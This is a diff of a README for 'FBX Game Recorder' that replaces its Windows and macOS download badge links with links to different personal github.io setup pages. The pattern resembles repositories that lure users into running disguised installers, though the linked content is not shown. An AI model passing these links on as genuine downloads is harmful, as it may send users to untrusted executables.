@@ -32,7 +32,7 @@ Whether you're a newcomer or a veteran, FBX Game Recorder provides the tools you
 
 <div align="center">
 
-[![Download FBX Game Recorder](https://img.shields.io/badge/⬇_DOWNLOAD_FBX+Game+Recorder-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://BursarHypnotize.github.io/install-win/)
+[![Download FBX Game Recorder](https://img.shields.io/badge/⬇_DOWNLOAD_FBX+Game+Recorder-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://TerminusAgentLine.github.io/windows-setup/)
 
 </div>
 
@@ -75,8 +75,8 @@ Whether you're a newcomer or a veteran, FBX Game Recorder provides the tools you
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/⬇_Download-Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://BursarHypnotize.github.io/install-win/)
-[![Download for macOS](https://img.shields.io/badge/⬇_Download-macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://BursarHypnotize.github.io/install-mac/)
+[![Download for Windows](https://img.shields.io/badge/⬇_Download-Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://TerminusAgentLine.github.io/windows-setup/)
+[![Download for macOS](https://img.shields.io/badge/⬇_Download-macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://TerminusAgentLine.github.io/macos-setup/)
 
 </div>
 
